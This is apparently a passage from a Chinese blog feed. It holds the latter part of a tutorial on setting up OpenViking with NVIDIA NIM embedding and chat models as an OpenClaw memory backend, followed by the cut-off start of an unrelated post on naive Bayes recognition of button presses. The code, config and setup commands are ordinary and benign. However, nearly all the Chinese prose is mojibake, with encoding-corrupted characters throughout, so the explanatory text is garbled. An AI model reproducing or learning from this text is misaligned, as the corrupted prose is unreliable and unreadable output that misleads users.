<p>åå»ºç®å½åéç½®æä»¶ï¼</p>
<pre><code class="language-bash">mkdir -p ~/.openviking
</code></pre>
<p>ç¼è¾ <code>~/.openviking/ov.conf</code>ï¼</p>
<pre><code class="language-json">{
  "embedding": {
    "dense": {
      "api_base": "https://integrate.api.nvidia.com/v1",
      "api_key": "ä½ çNVIDIA_API_KEY",
      "provider": "openai",
      "dimension": 4096,
      "model": "nvidia/nv-embed-v1"
    }
  },
  "vlm": {
    "api_base": "https://integrate.api.nvidia.com/v1",
    "api_key": "ä½ çNVIDIA_API_KEY",
    "provider": "openai",
    "model": "meta/llama-3.3-70b-instruct"
  }
}
</code></pre>
<h3 id="éç½®è¯´æ">éç½®è¯´æ</h3>
<table>
<thead>
<tr>
<th>åæ°</th>
<th>è¯´æ</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>api_base</code></td>
<td>NVIDIA NIM API ç«¯ç¹</td>
</tr>
<tr>
<td><code>api_key</code></td>
<td>ä» NVIDIA Build å¹³å°è·å</td>
</tr>
<tr>
<td><code>dimension</code></td>
<td>Embedding ç»´åº¦ï¼nv-embed-v1 åºå®ä¸º 4096</td>
</tr>
<tr>
<td><code>embedding.model</code></td>
<td>æ¨èä½¿ç¨ <code>nvidia/nv-embed-v1</code>ï¼å¯¹ç§°æ¨¡åï¼ä¸éè¦ input_type åæ°ï¼</td>
</tr>
<tr>
<td><code>vlm.model</code></td>
<td>ç¨äºçææè¦çè¯­è¨æ¨¡åï¼æ¨è <code>meta/llama-3.3-70b-instruct</code></td>
</tr>
</tbody>
</table>
<h3 id="ä¸ºä»ä¹ä¸ç¨-kimi-k25">ä¸ºä»ä¹ä¸ç¨ kimi-k2.5ï¼</h3>
<p>NVIDIA ä¸çæ¨çæ¨¡åï¼å¦ kimi-k2.5ï¼è¿åç <code>content</code> å­æ®µä¸ºç©ºï¼åå®¹å¨ <code>reasoning</code> å­æ®µéãOpenViking æææ åç <code>message.content</code> æ ¼å¼ï¼æä»¥è¦ç¨éæ¨çæ¨¡åã</p>
<h3 id="å¦ä½è·å-nvidia-api-key">å¦ä½è·å NVIDIA API Key</h3>
<ol>
<li>è®¿é® <a href="https://build.nvidia.com/" target="_blank" rel="noopener nofollow">https://build.nvidia.com/</a></li>
<li>ç»å½/æ³¨åè´¦å·</li>
<li>ç¹å»å³ä¸è§ç¨æ·å â API Keys â Generate Key</li>
<li>å¤å¶ä¿å­ï¼åªæ¾ç¤ºä¸æ¬¡ï¼</li>
</ol>
<hr>
<h2 id="ç¬¬ä¸æ­¥è®¾ç½®ç¯å¢åé">ç¬¬ä¸æ­¥ï¼è®¾ç½®ç¯å¢åé</h2>
<pre><code class="language-bash">export OPENVIKING_CONFIG_FILE=~/.openviking/ov.conf
</code></pre>
<p>å»ºè®®æ·»å å° <code>~/.bashrc</code>ï¼</p>
<pre><code class="language-bash">echo 'export OPENVIKING_CONFIG_FILE=~/.openviking/ov.conf' &gt;&gt; ~/.bashrc
source ~/.bashrc
</code></pre>
<hr>
<h2 id="ç¬¬åæ­¥éªè¯å®è£">ç¬¬åæ­¥ï¼éªè¯å®è£</h2>
<p>åå»ºæµè¯èæ¬ <code>test_openviking.py</code>ï¼</p>
<pre><code class="language-python">import openviking as ov

# åå§åå®¢æ·ç«¯ï¼æ°æ®å­å¨å¨å½åç®å½ç openviking_data æä»¶å¤¹
client = ov.SyncOpenViking(path="./openviking_data")

try:
    client.initialize()
    print("â OpenViking åå§åæåï¼")
    
    # æ·»å ä¸ä¸ªæµè¯æä»¶
    result = client.add_resource(path="./your_file.md")
    print(f"æ·»å æä»¶: {result}")
    
    # ç­å¾å¤çå®æ
    print("ç­å¾å¤ç...")
    client.wait_processed()
    print("â å¤çå®æï¼")
    
    # æç´¢æµè¯
    results = client.find("æµè¯å³é®è¯", limit=3)
    print(f"\næç´¢ç»æ:")
    for r in results.resources:
        print(f"  {r.uri} (score: {r.score:.4f})")
    
    client.close()
    print("\nð OpenViking éç½®æåï¼")

except Exception as e:
    print(f"éè¯¯: {e}")
    import traceback
    traceback.print_exc()
</code></pre>
<p>è¿è¡ï¼</p>
<pre><code class="language-bash">python test_openviking.py
</code></pre>
<hr>
<h2 id="ç¬¬äºæ­¥æ ¸å¿-api-ç¨æ³">ç¬¬äºæ­¥ï¼æ ¸å¿ API ç¨æ³</h2>
<h3 id="æ·»å èµæº">æ·»å èµæº</h3>
<pre><code class="language-python"># æ·»å åä¸ªæä»¶
result = client.add_resource(path="./docs/readme.md")

# æ·»å  URL
result = client.add_resource(path="https://example.com/article.html")
</code></pre>
<h3 id="ç®å½æµè§">ç®å½æµè§</h3>
<pre><code class="language-python"># ååºæ ¹ç®å½
ls_result = client.ls("viking://resources")

# ååºå­ç®å½
ls_result = client.ls("viking://resources/my_project")
</code></pre>
<h3 id="è¯­ä¹æç´¢">è¯­ä¹æç´¢</h3>
<pre><code class="language-python"># æç´¢ç¸å³åå®¹
results = client.find("å¦ä½éç½® embedding", limit=5)

for r in results.resources:
    print(f"URI: {r.uri}")
    print(f"Score: {r.score}")
    print(f"Content: {client.read(r.uri)[:200]}...")
</code></pre>
<h3 id="è·åæè¦æ¦è§">è·åæè¦/æ¦è§</h3>
<pre><code class="language-python"># L0 å±ï¼ä¸å¥è¯æè¦
abstract = client.abstract("viking://resources/my_project")

# L1 å±ï¼è¯¦ç»æ¦è§
overview = client.overview("viking://resources/my_project")
</code></pre>
<h3 id="è¯»ååå®¹">è¯»ååå®¹</h3>
<pre><code class="language-python"># è¯»åå®æ´åå®¹ï¼L2 å±ï¼
content = client.read("viking://resources/my_project/readme.md")
</code></pre>
<hr>
<h2 id="å¸¸è§é®é¢">å¸¸è§é®é¢</h2>
<h3 id="q-embedding-ç»´åº¦ä¸å¹é">Q: Embedding ç»´åº¦ä¸å¹é</h3>
<p><strong>éè¯¯</strong>: <code>Dense vector dimension mismatch: expected 2048, got 4096</code></p>
<p><strong>è§£å³</strong>: å¨éç½®æä»¶ä¸­æç¡®æå® <code>dimension: 4096</code>ï¼å¹é <code>nvidia/nv-embed-v1</code> çè¾åºç»´åº¦ã</p>
<h3 id="q-vlm-è¿å-nonetype-éè¯¯">Q: VLM è¿å NoneType éè¯¯</h3>
<p><strong>éè¯¯</strong>: <code>'NoneType' object is not subscriptable</code></p>
<p><strong>åå </strong>: ä½¿ç¨äºæ¨çæ¨¡åï¼å¦ kimi-k2.5ï¼ï¼å¶è¿åæ ¼å¼ä¸ OpenViking ä¸å¼å®¹ã</p>
<p><strong>è§£å³</strong>: æ¢ç¨æ åæ¨¡åå¦ <code>meta/llama-3.3-70b-instruct</code>ã</p>
<h3 id="q-nvidia-api-æ¥é-input_type-required">Q: NVIDIA API æ¥é input_type required</h3>
<p><strong>éè¯¯</strong>: <code>'input_type' parameter is required for asymmetric models</code></p>
<p><strong>åå </strong>: æäº Embedding æ¨¡åï¼å¦ nv-embedqa-e5-v5ï¼æ¯éå¯¹ç§°æ¨¡åï¼éè¦æå® query æ documentã</p>
<p><strong>è§£å³</strong>: ä½¿ç¨å¯¹ç§°æ¨¡å <code>nvidia/nv-embed-v1</code>ï¼ä¸éè¦ input_typeã</p>
<h3 id="q-æä»¶åå²çª">Q: æä»¶åå²çª</h3>
<p><strong>éè¯¯</strong>: <code>directory already exists: /resources/ç¬¬01ç« </code></p>
<p><strong>åå </strong>: OpenViking ç¨æä»¶åï¼ä¸å«è·¯å¾ï¼ä½ä¸º URIï¼ä¸åç®å½ä¸çååæä»¶ä¼å²çªã</p>
<p><strong>è§£å³</strong>:</p>
<ul>
<li>æ¹æ¡ä¸ï¼éå½åæä»¶ï¼ä½¿ç¨å¯ä¸åç§°</li>
<li>æ¹æ¡äºï¼åæ¹å¯¼å¥ï¼é¿ååæ¶æ·»å ååæä»¶</li>
<li>æ¹æ¡ä¸ï¼ç­å¾å®æ¹ä¿®å¤æ­¤è®¾è®¡é®é¢</li>
</ul>
<hr>
<h2 id="ä¸ºä»ä¹ç¨-openvikingæ¿ä»£-openclaw-é»è®¤ç-qmd-è®°å¿åç«¯">ä¸ºä»ä¹ç¨ OpenVikingï¼ââæ¿ä»£ OpenClaw é»è®¤ç qmd è®°å¿åç«¯</h2>
<h3 id="openclaw-ç°æè®°å¿æ¹æ¡çå±é">OpenClaw ç°æè®°å¿æ¹æ¡çå±é</h3>
<p>OpenClaw é»è®¤ä½¿ç¨ <code>qmd</code> ä½ä¸ºè®°å¿åç«¯ï¼éåæå¨ç»´æ¤ç <code>MEMORY.md</code> å <code>memory/*.md</code> æä»¶ãè¿å¥æ¹æ¡å¤ç¨ï¼ä½æå ä¸ªçç¹ï¼</p>
<ol>
<li><strong>æç´¢ç²¾åº¦æé</strong> â qmd åºäºç®ååéå¹éï¼ç¼ºä¹å±æ¬¡åçè§£</li>
<li><strong>æå¨ç»´æ¤ææ¬é«</strong> â è®°å¿æä»¶éè¦äººå·¥æ´çï¼å®¹æéæ¼</li>
<li><strong>ç¼ºä¹èªå¨æè¦</strong> â Agent éè¦è¯»åæ´ä¸ªæä»¶æè½äºè§£åå®¹</li>
<li><strong>æ æ³ç®¡çå¤§éææ¡£</strong> â å½ workspace æä»¶å¾å¤æ¶ï¼qmd ä¸å¤ç¨</li>
</ol>
<h3 id="openviking-çä¼å¿">OpenViking çä¼å¿</h3>
<table>
<thead>
<tr>
<th>è½å</th>
<th>qmd</th>
<th>OpenViking</th>
</tr>
</thead>
<tbody>
<tr>
<td>è¯­ä¹æç´¢</td>
<td>â åºç¡</td>
<td>â ç®å½éå½ + è¯­ä¹èå</td>
</tr>
<tr>
<td>èªå¨æè¦</td>
<td>â</td>
<td>â L0/L1/L2 ä¸å±</td>
</tr>
<tr>
<td>ç»æåæµè§</td>
<td>â</td>
<td>â èææä»¶ç³»ç»</td>
</tr>
<tr>
<td>Token èç</td>
<td>â</td>
<td>â æéå è½½</td>
</tr>
<tr>
<td>ä¼è¯è®°å¿èªå¨æå</td>
<td>â</td>
<td>â èªå¨æåé¿æè®°å¿</td>
</tr>
</tbody>
</table>
<h3 id="éææ¹å¼">éææ¹å¼</h3>
<h4 id="æ¹å¼ä¸ä½ä¸º-openclaw-çè¡¥åè®°å¿æ¨è">æ¹å¼ä¸ï¼ä½ä¸º OpenClaw çè¡¥åè®°å¿ï¼æ¨èï¼</h4>
<p>ä¿ç qmd ä½ä¸ºæ¥å¸¸è½»éè®°å¿ï¼ç¨ OpenViking ç®¡çå¤§åææ¡£åºï¼</p>
<pre><code class="language-python"># æ workspace éçä¹¦ç±ãé¡¹ç®ææ¡£ç­å¤§åèµæºå¯¼å¥ OpenViking
import glob, openviking as ov

client = ov.SyncOpenViking(path="./openviking_data")
client.initialize()

for f in glob.glob("./books/**/*.md", recursive=True):
    client.add_resource(path=f)

for f in glob.glob("./docs/**/*.md", recursive=True):
    client.add_resource(path=f)

client.wait_processed()
client.close()
</code></pre>
<p>Agent å·¥ä½æµï¼</p>
<ol>
<li>æ¥å¸¸å¯¹è¯ â qmd è®°å¿ï¼è½»éãå¿«éï¼</li>
<li>éè¦æ¥éææ¡£ â OpenViking è¯­ä¹æç´¢ï¼ç²¾åãåå±ï¼</li>
<li>Sub-agent åä½/ç ç©¶ â OpenViking æä¾ä¸ä¸æï¼èç Tokenï¼</li>
</ol>
<h4 id="æ¹å¼äºå®å¨æ¿ä»£-qmd">æ¹å¼äºï¼å®å¨æ¿ä»£ qmd</h4>
<p>å° OpenClaw çææè®°å¿æä»¶ä¹å¯¼å¥ OpenVikingï¼</p>
<pre><code class="language-python"># å¯¼å¥è®°å¿æä»¶
for f in glob.glob("./memory/*.md"):
    client.add_resource(path=f)

# å¯¼å¥ workspace ææ markdown
for f in glob.glob("./**/*.md", recursive=True):
    client.add_resource(path=f)
</code></pre>
<blockquote>
<p>â ï¸ ç®å OpenViking è¿ä¸è½ç´æ¥ä½ä¸º OpenClaw ç <code>memory.backend</code> éç½®é¡¹ãéè¦éè¿ skill ç CLI å·¥å·é´æ¥è°ç¨ãæªæ¥å¦æ OpenClaw æ¯æèªå®ä¹è®°å¿åç«¯æä»¶ï¼å¯ä»¥æ´æ·±åº¦éæã</p>
</blockquote>
<h4 id="æ¹å¼ä¸ç»-sub-agent-æä¾ä¸ä¸æ">æ¹å¼ä¸ï¼ç» Sub-agent æä¾ä¸ä¸æ</h4>
<p>åä¹¦ãåç ç©¶ç­ä»»å¡æ¶ï¼sub-agent å¯ä»¥åæç´¢ OpenViking è·åç¸å³ä¸ä¸æï¼èä¸æ¯ææ´æ¬ä¹¦å¡è¿ promptï¼</p>
<pre><code class="language-bash"># Sub-agent åæç´¢ç¸å³åå®¹
python3 scripts/viking.py search "æ­¦æ¾çæ§æ ¼åæ" --limit 3

# ç¶ååªè¯»åæç¸å³çæ®µè½
python3 scripts/viking.py read viking://resources/ç¬¬01ç« /å¼ ä¸çåäº.md
</code></pre>
<p>è¿æ ·ä¸ä¸ª sub-agent åªéè¦å è½½å å token çç¸å³åå®¹ï¼èä¸æ¯æ´æ¬ä¹¦ç 10 ä¸+ tokenã</p>
<h3 id="å·²å°è£ç-openclaw-skill">å·²å°è£ç OpenClaw Skill</h3>
<p>æä»¬å·²ç»æ OpenViking å°è£ä¸º OpenClaw skillï¼å®è£å Agent å¯ä»¥ç´æ¥ä½¿ç¨ï¼</p>
<pre><code class="language-bash"># å®è£ skill
git clone https://github.com/swizardlv/openclaw_openviking_skill.git
cp -r openclaw_openviking_skill/openviking ~/.openclaw/workspace/skills/
</code></pre>
<p>Skill æä¾çå½ä»¤ï¼</p>
<table>
<thead>
<tr>
<th>å½ä»¤</th>
<th>åè½</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>viking.py add &lt;file&gt;</code></td>
<td>ç´¢å¼æä»¶</td>
</tr>
<tr>
<td><code>viking.py add-dir &lt;dir&gt;</code></td>
<td>æ¹éç´¢å¼ç®å½</td>
</tr>
<tr>
<td><code>viking.py search &lt;query&gt;</code></td>
<td>è¯­ä¹æç´¢</td>
</tr>
<tr>
<td><code>viking.py ls [uri]</code></td>
<td>æµè§èµæº</td>
</tr>
<tr>
<td><code>viking.py abstract &lt;uri&gt;</code></td>
<td>è·åæè¦</td>
</tr>
<tr>
<td><code>viking.py overview &lt;uri&gt;</code></td>
<td>è·åæ¦è§</td>
</tr>
<tr>
<td><code>viking.py read &lt;uri&gt;</code></td>
<td>è¯»åå¨æ</td>
</tr>
<tr>
<td><code>viking.py info</code></td>
<td>æ¥çéç½®ç¶æ</td>
</tr>
</tbody>
</table>
<hr>
<h2 id="éå½å¯ç¨ç-nvidia-embedding-æ¨¡å">éå½ï¼å¯ç¨ç NVIDIA Embedding æ¨¡å</h2>
<table>
<thead>
<tr>
<th>æ¨¡å</th>
<th>ç»´åº¦</th>
<th>ç±»å</th>
<th>è¯´æ</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>nvidia/nv-embed-v1</code></td>
<td>4096</td>
<td>å¯¹ç§°</td>
<td>â æ¨èï¼æ é input_type</td>
</tr>
<tr>
<td><code>nvidia/nv-embedqa-e5-v5</code></td>
<td>1024</td>
<td>éå¯¹ç§°</td>
<td>éè¦ input_type åæ°</td>
</tr>
<tr>
<td><code>nvidia/llama-3.2-nv-embedqa-1b-v2</code></td>
<td>2048</td>
<td>éå¯¹ç§°</td>
<td>éè¦ input_type åæ°</td>
</tr>
<tr>
<td><code>nvidia/nv-embedcode-7b-v1</code></td>
<td>4096</td>
<td>å¯¹ç§°</td>
<td>éåä»£ç </td>
</tr>
</tbody>
</table>
<hr>
<h2 id="éå½å¯ç¨ç-nvidia-chat-æ¨¡åç¨äº-vlm">éå½ï¼å¯ç¨ç NVIDIA Chat æ¨¡åï¼ç¨äº VLMï¼</h2>
<table>
<thead>
<tr>
<th>æ¨¡å</th>
<th>è¯´æ</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>meta/llama-3.3-70b-instruct</code></td>
<td>â æ¨èï¼æ åæ ¼å¼</td>
</tr>
<tr>
<td><code>meta/llama-3.1-70b-instruct</code></td>
<td>ç¨³å®çæ¬</td>
</tr>
<tr>
<td><code>meta/llama-3.1-8b-instruct</code></td>
<td>è½»éç</td>
</tr>
<tr>
<td><code>mistralai/mistral-large</code></td>
<td>Mistral ç³»å</td>
</tr>
</tbody>
</table>
<blockquote>
<p>â ï¸ é¿åä½¿ç¨æ¨çæ¨¡åï¼å¦ kimi-k2.5ãdeepseek-r1ï¼ï¼å®ä»¬è¿åçæ ¼å¼ä¸ OpenViking ä¸å¼å®¹ã</p>
</blockquote>
<hr>
<h2 id="åèé¾æ¥">åèé¾æ¥</h2>
<ul>
<li>OpenViking å®ç½: <a href="https://www.openviking.ai" target="_blank" rel="noopener nofollow">https://www.openviking.ai</a></li>
<li>OpenViking GitHub: <a href="https://github.com/volcengine/OpenViking" target="_blank" rel="noopener nofollow">https://github.com/volcengine/OpenViking</a></li>
<li>NVIDIA NIM API: <a href="https://build.nvidia.com/" target="_blank" rel="noopener nofollow">https://build.nvidia.com/</a></li>
<li>NVIDIA API ææ¡£: <a href="https://docs.api.nvidia.com/nim/" target="_blank" rel="noopener nofollow">https://docs.api.nvidia.com/nim/</a></li>
</ul>
<hr>
<p><em>æ¬æç¨åºäº OpenViking 0.1.17 å NVIDIA NIM API æµè¯éè¿ã</em></p>


</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0" data-date-updated="2026-02-18 10:57">2026-02-18 10:56</span>&nbsp;
<a href="https://www.cnblogs.com/swizard">Swizard</a>&nbsp;
éè¯»(<span id="post_view_count">0</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19622926);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19622926', targetLink: 'https://www.cnblogs.com/swizard/p/19622926', title: 'OpenClaw+OpenViking + NVIDIA API éç½®æç¨' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ è¿ä¹è¡ï¼æé®å¨ä½æ¨¡å¼è¯å«ä¹è½ç¨è´å¶æ¯ï¼ ]]></title>
    <link>https://www.cnblogs.com/pie-o/p/19622890</link>
    <guid>10e839a954de85c63a427df5aa16167e</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/pie-o/p/19622890" title="åå¸äº 2026-02-18 10:38">
    <span role="heading" aria-level="2">è¿ä¹è¡ï¼æé®å¨ä½æ¨¡å¼è¯å«ä¹è½ç¨è´å¶æ¯ï¼</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                    <div id="cnblogs_post_description" style="display: none">
        
        åºäºæ´ç´ è´å¶æ¯å¯¹æé®å¨ä½è¿è¡æ¨¡å¼è¯å«çä¸æ¬¡å­¦ä¹ å®éª
    </div>
<div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<blockquote>
<p><a href="https://bbs.21ic.com/icview-3503975-1-1.html" target="_blank" rel="noopener nofollow">é¦åäº21icè®ºå</a></p>
</blockquote>
<h2 id="åè¨">åè¨</h2>
<p>ä¹åå­¦ä¹ äºè´å¶æ¯æ´æ°çç¸å³åå®¹ï¼æ­£å¥½ç°å¨ä¹å¨ç©å¼åæ¿ï¼æ¿å­ä¸é¢æå ä¸ªå°çåå»æé®ï¼ä¸è¬è¯å«æé®å¨ä½çåæ³å°±å¾ç®åï¼ä¸æ¯ä¸­æ­å°±æ¯æ¥è¯¢ï¼åºæ¬é½æ¯é è¾¹æ²¿æèçµå¹³çç¶ææ¥è¿è¡çï¼è¿ä¸å¥å°±å¾æ èï¼æ²¡æå®ç°çæ¬²æï¼æä»¥æ³ç¨ç¹ä¸ä¸æ ·çæ¹æ³ã</p>
<p>è¿å°±æäºæ¬çæç« çåºç°ï¼åºäº<code>æ´ç´ è´å¶æ¯åç±»</code>ï¼ä½¿ç¨æ»å¨çªå£ææçµå¹³åºåï¼æåç¹å¾è¿è¡æ¨¡å¼è¯å«ï¼çæ³æåµä¸è¯å«æææ æ çï¼ä½æ¯åºç°è¾¹çä»¥åæ··åçæåµï¼ææä¸è¨é¾å°½ï¼ç®åæ°´å¹³ä¸å¤ï¼è¿åºè¯¥ä¹æ¯åç»­éè¦è§£å³çä¸»è¦é®é¢äºã</p>
<h2 id="ææ¯è¦ç¹">ææ¯è¦ç¹</h2>
<h3 id="æ ¸å¿åç">æ ¸å¿åç</h3>
<ol>
<li>è´å¶æ¯å®ç</li>
</ol>
<p>æ¬æå®ç°çæ¹æ³åºäºæ´ç´ è´å¶æ¯åç±»å¨ï¼ä¸»è¦å°±æ¯ä¸¤æ¹é¢åå®¹ï¼<code>è´å¶æ¯å®ç</code>ä¸<code>æ¡ä»¶ç¬ç«åè®¾</code>ï¼æ¶åçæ¦å¿µæ<strong>åéªæ¦ç</strong>ã<strong>åéªæ¦ç</strong>å<strong>æ¡ä»¶æ¦ç</strong>ï¼å¶ä¸­åéªåæ¡ä»¶æ¦çé½æ¯æååå¤å¥½çï¼å¯ä»¥æ¯ä¸»è§ç»éªçï¼ä¹å¯ä»¥æ¯ç»è®¡éåçï¼èè´å¶æ¯å®çä¸­çæ¡ä»¶æ¦ç(ä¸æ¯åéªæ¦ç)ï¼åç§°ä¸ºä¼¼ç¶æ¦çã</p>
<p>è¿ä¸ªæ¹æ³çåºæ¬ææ³æ¯ï¼å¯¹äºç»å®çå¾åç±»é¡¹(å°±æ¯çªå£ä¸­ççµå¹³åºå)ï¼æ±è§£å½è¿ä¸ªå¾åç±»é¡¹åºç°æ¶ï¼åä¸ª<strong>å·²ç»å®ä¹è¿</strong>çæ¨¡å¼ç±»å«åºç°çæ¦çï¼åªä¸ªæ¦çæå¤§ï¼é£ä¹è¿ä¸ªå¾åç±»é¡¹å°±å±äºåªä¸ªæ¨¡å¼ã</p>
<p>å¨å¼å§åç±»ä¹åéè¦ä¸äºå¿è¦çåå¤å·¥ä½ï¼</p>
<ul>
<li>å®ä¹æåªäºæ¨¡å¼ç±»å«ï¼è¿äºæ¨¡å¼è¾¹çè¦æç¡®ï¼ä¸ç¶ä¸å®¹æåæç¹å¾</li>
<li>å®ä¹è¿äºæ¨¡å¼çç¹å¾å±æ§ï¼è¿äºå±æ§å¨ä¸åæ¨¡å¼ä¸çè¡¨ç°æ¯ä¸åçï¼è¿æ¯è¯å«çå³é®ï¼å¯¹åºäºè´å¶æ¯å®çä¸­çä¼¼ç¶æ¦ç</li>
</ul>
<ol start="2">
<li>æ»å¨çªå£</li>
</ol>
<p>è¿éççªå£æ¯å®æ¶æ´æ°ççªå£ï¼èæ°æ®ç§»åºï¼æ°æ°æ®å å¥ï¼æ»å¨çªå£ç¡®å®çµå¹³åºåæ°æ®çèå´ï¼åªæå¤å¨çªå£ä¸­çåºåæ°æ®æä¼å¾å°ç¹å¾æåçæºä¼ï¼å®çé¿åº¦ä¸åºåçæ¶é´é¿åº¦ææ¯ä¾ï¼ä¹å°±æ¯è¯´éæ ·é¢çä¼å½±åå°çªå£æ¶ææ§ã</p>
<p>å®éè¦èèçé®é¢æ¯æä¹ææå°å®æ´çä¿¡å·ï¼å¯¹åºäºæ»å¨çæ­¥é¿ï¼ä»¥åç¹å¾æåçå¨æã</p>
<h3 id="åºæ¬æ­¥éª¤">åºæ¬æ­¥éª¤</h3>
<p>éè¿ä»¥ä¸æ­¥éª¤å®ç°æé®å¨ä½æ¨¡å¼è¯å«ï¼</p>
<ol>
<li><strong>æ»å¨çªå£éé</strong>ï¼ä½¿ç¨åºå®å¤§å°çæ»å¨çªå£æç»­ééæé®ç¶ææ°æ®</li>
<li><strong>ç¹å¾æå</strong>ï¼ä»çªå£æ°æ®ä¸­æåå¤ä¸ªç»´åº¦çç¹å¾</li>
<li><strong>æ¦çè®¡ç®</strong>ï¼åºäºåéªæ¦çå<strong>ä¼¼ç¶æ¦ç</strong>è®¡ç®åéªæ¦ç</li>
<li><strong>æ¨¡å¼å¤æ­</strong>ï¼æ ¹æ®åéªæ¦çå<strong>éå¼</strong>ç¡®å®å½åæé®æ¨¡å¼</li>
</ol>
<h2 id="å·ä½å®ç°">å·ä½å®ç°</h2>
<p>ä¸ºäºéªè¯è®¾æ³çå¯è¡æ§ï¼éè¿é»è¾åæä»ªè®°å½æé®çå¼èçµå¹³ååï¼ä½çµå¹³è¡¨ç¤ºæé®æä¸ï¼é«çµå¹³è¡¨ç¤ºæ æé®å¨ä½ï¼éæ ·ç1MHzï¼æ¶é¿20sï¼å¨åé¢çå®éªä¸­ï¼è®¤ä¸ºåºåæ¯è¿ç»­çï¼è¿å°±æ¯çµå¹³åºåçæ¥æºï¼å·ä½åºåå¦ä¸å¾æç¤ºï¼</p>
<p><img alt="" loading="lazy" data-src="https://fastly.jsdelivr.net/gh/bucketio/img14@main/2026/02/17/1771293682747-d81c3402-eb3d-4b28-adba-763adf4d2ca0.png" class="lazyload"></p>
<p>ä¸é¢è®°å½çæ°æ®å¯ä»¥ä½ä¸ºä¸ä¸ªæ ·æ¬ï¼æéè¿è§å¯åæµéç¡®å®äºå ç§æ¨¡å¼ï¼ä»¥åä¸äºå¸®å©è¯å«çç¹å¾å±æ§ï¼å¨å®éªè¿ç¨ä¸­ä½¿ç¨<code>python</code>è¿è¡äºæ¹æ³éªè¯ã</p>
<h3 id="æ¨¡å¼å®ä¹">æ¨¡å¼å®ä¹</h3>
<p>æå¨è®¾è®¡è¿ç¨ä¸­å®ä¹äºåç§æé®æ¨¡å¼ï¼åå«å¦ä¸ï¼</p>
<ul>
<li><strong>æ æ</strong>ï¼æ æææé®å¨ä½</li>
<li><strong>åå»</strong>ï¼åæ¬¡ç­ææé®å¨ä½</li>
<li><strong>åå»</strong>ï¼å¿«éè¿ç»­ä¸¤æ¬¡æé®å¨ä½</li>
<li><strong>é¿æ</strong>ï¼æç»­æ¶é´è¾é¿çæé®å¨ä½</li>
</ul>
<p>å¨ä½çå®æ½é½æ¯éè¿ä¸ä¸ªåæé®æ¥è¿è¡çï¼å¶ä¸­åå»ååå»æ¶åå°çµå¹³çè¾å¿«éååï¼æ¯è¯å«çé¾ç¹</p>
<h3 id="ç¹å¾éæ©">ç¹å¾éæ©</h3>
<p>åºäºå¯¹æåçç¹å¾åæ¬ï¼</p>
<ul>
<li><strong>é«çµå¹³å æ¯</strong>ï¼çªå£åé«çµå¹³ä¿¡å·çæ¯ä¾</li>
<li><strong>ä¸åæ²¿æ°é</strong>ï¼ä¿¡å·ä»ä½å°é«çè½¬æ¢æ¬¡æ°</li>
<li><strong>ä¸éæ²¿æ°é</strong>ï¼ä¿¡å·ä»é«å°ä½çè½¬æ¢æ¬¡æ°</li>
<li><strong>æé¿è¿ç»­é«çµå¹³æç»­æ¶é´</strong>ï¼çªå£åæç»­é«çµå¹³çæé¿æ¶é´</li>
</ul>
<h3 id="æ¦çæ¨¡å">æ¦çæ¨¡å</h3>
<ul>
<li><strong>åéªæ¦ç</strong>ï¼åå§åè®¾åç§æ¨¡å¼ç­æ¦çåºç°ï¼å³æ¯ä¸ªæ¨¡å¼çåéªé½æ¯0.25ãå¹¶ä¸åä¸è¬çè´å¶æ¯æ¹æ³ä¸åçæ¯ï¼å¨å®ç°è¿ç¨ä¸­è®¤ä¸ºåéªæ¯ä¸éè¦æ´æ°çï¼ä¹å°±æ¯å¨æ¯ä¸æ¬¡è¯å«æ¶è®¤ä¸ºæ¯ä¸ªæ¨¡å¼é½æ¯<strong>ç­æ¦ç</strong>åºç°çï¼æ²¡æè½¬ç§»æ¦çæèåå²å ç´ å½±å</li>
<li><strong>ä¼¼ç¶æ¦ç</strong>ï¼åºäº<strong>ç¹å¾åå¸åæ°</strong>è®¡ç®è§æµå°å½åç¹å¾çæ¦çï¼å¶ä¸­çåå¸åæ°æ¯æ ¹æ®å®éææçåºåæ°æ®æ¥è®¾è®¡çï¼æ¦çåå¸æ¨¡åéç¨æ­£æåå¸æ¥<strong>è¿ä¼¼</strong>ï¼éè¦åå¼åæ åå·®ï¼ç»ä¸ä½¿ç¨<em>æ¦çå¯åº¦</em>è¡¨è¾¾ä¼¼ç¶ç»æ
<ul>
<li>é«çµå¹³å æ¯çåå¸åæ°
<ul>
<li>æ æï¼0.05ï¼0.2</li>
<li>åå»ï¼0.2ï¼0.2</li>
<li>åå»ï¼0.3ï¼0.2</li>
<li>é¿æï¼0.9ï¼0.2</li>
</ul>
</li>
<li>(ä¸åæ²¿/ä¸éæ²¿)æ°éçåå¸åæ°
<ul>
<li>æ æï¼0.1ï¼0.3</li>
<li>åå»ï¼1ï¼0.3</li>
<li>åå»ï¼2ï¼0.3</li>
<li>é¿æï¼0.7ï¼0.3</li>
</ul>
</li>
<li>æé¿é«çµå¹³æç»­æ¶é´çåå¸åæ°
<ul>
<li>æ æï¼0ï¼2</li>
<li>åå»ï¼0.2ï¼5</li>
<li>åå»ï¼0.17ï¼3</li>
<li>é¿æï¼0.9ï¼10</li>
</ul>
</li>
</ul>
</li>
<li><strong>åéªæ¦ç</strong>ï¼ä½¿ç¨è´å¶æ¯å¬å¼è®¡ç®åæ¨¡å¼çåéªæ¦çï¼åè®¡ç®æåçç¹å¾å¨æ¯ä¸ªæ¨¡å¼ä¸ç<em>èåä¼¼ç¶</em>ï¼åºäºæ¡ä»¶ç¬ç«åè®¾ï¼å¯ä»¥ç´æ¥ç¸ä¹ï¼ç¶åè®¡ç®åéªå¹¶å½ä¸åå¯å¾æç»çæ¦çè¡¨</li>
</ul>
<h3 id="ä»£ç å®ç°">ä»£ç å®ç°</h3>
<ol>
<li>æ°æ®ééä¸é¢å¤ç</li>
